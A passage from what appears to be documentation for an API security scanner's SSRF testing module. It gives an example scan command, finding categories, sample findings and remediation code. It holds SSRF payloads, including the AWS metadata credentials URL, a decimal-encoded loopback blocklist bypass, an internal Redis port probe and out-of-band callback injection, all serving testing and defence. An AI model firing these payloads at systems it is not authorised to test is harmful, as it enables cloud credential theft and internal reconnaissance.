#    Cookie: session=<orig_cookie>
#    Content-Type: application/json
#    {"imageUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
#     "name": "Alice"}      ← non-URL field keeps original value
```

**apileaks command:**
```bash
# HAR from Caido with an extra explicit field
python apileaks.py owasp ssrf \
  --target https://staging-api.victima.com \
  --har ~/caido_traffic.har \
  --ssrf-body-field internalServiceUrl \
  --ssrf-callback-url https://xyz.interact.sh
```

**Findings emitted:** same categories as normal body injection (`SSRF_INTERNAL_ACCESS`, `SSRF_CLOUD_METADATA`, `SSRF_BLIND`, `SSRF_SCHEME_BYPASS`) — the difference is that the probes carry the correct auth context from real captured traffic, dramatically increasing the likelihood of reaching authenticated-only SSRF surfaces.

## 📊 Finding Categories

All SSRF findings map to OWASP **API7**.

| Category | Severity | When emitted |
|----------|----------|--------------|
| `SSRF_INTERNAL_ACCESS` | CRITICAL | Internal/loopback content signature matched in response body |
| `FILE_PROTOCOL_ACCESS` | CRITICAL | File-system content (e.g. `/etc/passwd`) returned via scheme probe |
| `SSRF_CLOUD_METADATA` | CRITICAL | Cloud metadata content signature matched from a cloud metadata probe |
| `SSRF_BLIND` | CRITICAL | 2xx response to callback URL injection with no reflected internal content |
| `SSRF_SCHEME_BYPASS` | HIGH | Bypass-encoded probe or scheme probe returns status < 500 |
| `SSRF_PORT_SCAN` | MEDIUM | Internal port probe: non-4xx status or response time anomaly detected |

### Example findings

**SSRF_CLOUD_METADATA — AWS credentials reachable**
```
Category:    SSRF_CLOUD_METADATA
Severity:    CRITICAL
Endpoint:    GET https://api.example.com/fetch
Injection:   query[url] = http://169.254.169.254/latest/meta-data/iam/security-credentials/
Signature:   iam/security-credentials
Evidence:    Cloud metadata content reached via query injection. Signature matched:
             'iam/security-credentials'. Status: 200.
```

**SSRF_BLIND — Potential blind SSRF via header injection**
```
Category:    SSRF_BLIND
Severity:    CRITICAL
Endpoint:    POST https://api.example.com/webhook
Injection:   header[X-Forwarded-For] = https://xyz.interact.sh
Evidence:    Potential blind SSRF — server returned 2xx without reflecting internal
             content. Check your OOB listener for an incoming request.
```

**SSRF_SCHEME_BYPASS — Bypass encoding evaded blocklist**
```
Category:    SSRF_SCHEME_BYPASS
Severity:    HIGH
Endpoint:    GET https://api.example.com/proxy
Injection:   query[url] = http://2130706433/
Evidence:    Decimal-encoded loopback (127.0.0.1) returned 2xx — blocklist bypass confirmed.
```

**SSRF_PORT_SCAN — Internal port 6379 (Redis) reachable**
```
Category:    SSRF_PORT_SCAN
Severity:    MEDIUM
Endpoint:    GET https://api.example.com/fetch
Injection:   query[url] = http://127.0.0.1:6379/
Evidence:    Internal port 6379 appears reachable. Status: 200.
             Response time: 12.3 ms. Median across probed ports: 4892.1 ms.
```

## 🔐 Safe Mode Interaction Matrix

| Probe type | `safe_mode=false` | `safe_mode=true` |
|------------|-------------------|------------------|
| Query param injection (any method) | ✅ | ✅ GET/HEAD only |
| Header injection (any method) | ✅ | ✅ GET/HEAD only |
| Body injection (POST/PUT/PATCH) | ✅ if `body_injection=true` | ❌ skipped |
| OOB callback on GET/HEAD | ✅ if `callback_url` set | ✅ if `callback_url` set |
| OOB callback on POST/PUT/PATCH body | ✅ if `callback_url` set | ❌ skipped |
| Port scan probes | ✅ if `allow_port_scan=true` | ❌ skipped |
| Redirect-chain probes | ✅ if `allow_port_scan=true` | ❌ skipped |
| Full Replay Mode — GET/HEAD from import | ✅ | ✅ |
| Full Replay Mode — POST/PUT/PATCH/DELETE from import | ✅ | ❌ skipped |

## 🛠️ Remediation

### Validate and allow-list outbound targets

The most effective defense. Instead of blocking known-bad destinations, explicitly enumerate permitted outbound hosts:

```python
# Good: strict allow-list
ALLOWED_OUTBOUND_HOSTS = {"api.trusted-partner.com", "cdn.example.com"}

def fetch_url(url: str) -> bytes:
    parsed = urllib.parse.urlparse(url)
    if parsed.hostname not in ALLOWED_OUTBOUND_HOSTS:
        raise ValueError(f"Outbound request to '{parsed.hostname}' is not permitted.")
    if parsed.scheme not in {"http", "https"}:
        raise ValueError(f"URL scheme '{parsed.scheme}' is not permitted.")
    return requests.get(url, timeout=5).content
```

### Block access to cloud instance metadata

Enforce network-layer rules that prevent any application process from reaching link-local metadata addresses:

```bash
# Linux iptables — drop outbound traffic to 169.254.169.254 from the app user
iptables -A OUTPUT -m owner --uid-owner app_user -d 169.254.169.254 -j DROP

# AWS: use IMDSv2 (token-required) to harden the metadata endpoint
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxx \
  --http-tokens required \
  --http-endpoint enabled
```

### Disable dangerous URL schemes in server-side fetchers

Restrict any library that performs server-side URL fetching to `http://` and `https://` only:

```python
# Good: restrict schemes before any request is issued
import urllib.parse

def validate_url(url: str) -> str:
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in {"http", "https"}:
        raise ValueError(f"Scheme '{parsed.scheme}' is not allowed.")
    return url
```

### Reject loopback and RFC-1918 addresses

In addition to scheme validation, explicitly block loopback and private IP ranges at the application level and/or via an egress firewall:

```python
import ipaddress, socket

BLOCKED_RANGES = [
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),  # link-local / metadata
    ipaddress.ip_network("::1/128"),          # IPv6 loopback
]

def is_blocked(hostname: str) -> bool:
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(hostname))
    except (socket.gaierror, ValueError):
        return True  # Unresolvable or invalid — block by default
    return any(ip in network for network in BLOCKED_RANGES)
```

### Disable automatic redirect following

Many SSRF payloads rely on redirect chains. Configure server-side HTTP clients to not follow redirects automatically:

```python
# requests — disable redirect following
response = requests.get(url, allow_redirects=False, timeout=5)

# httpx — disable redirect following
async with httpx.AsyncClient(follow_redirects=False) as client:
    response = await client.get(url)
```

### Sanitize URL-accepting JSON body fields

If your API accepts URLs in body fields (e.g. `webhook`, `imageUrl`, `callback`), validate them against the same allow-list used for query-parameter inputs:

```python
class WebhookRequest(BaseModel):
    callback_url: AnyHttpUrl  # Pydantic validates scheme; add host validation separately

    @validator("callback_url")
    def validate_callback(cls, v):
        if v.host not in ALLOWED_OUTBOUND_HOSTS:
            raise ValueError("callback_url host is not in the permitted list")
        return v
```

---

The SSRF Testing Module provides full-coverage detection of API7 vulnerabilities, from blind OOB callbacks and cloud credential exposure to blocklist-bypass encodings and internal port reachability. 🛡️
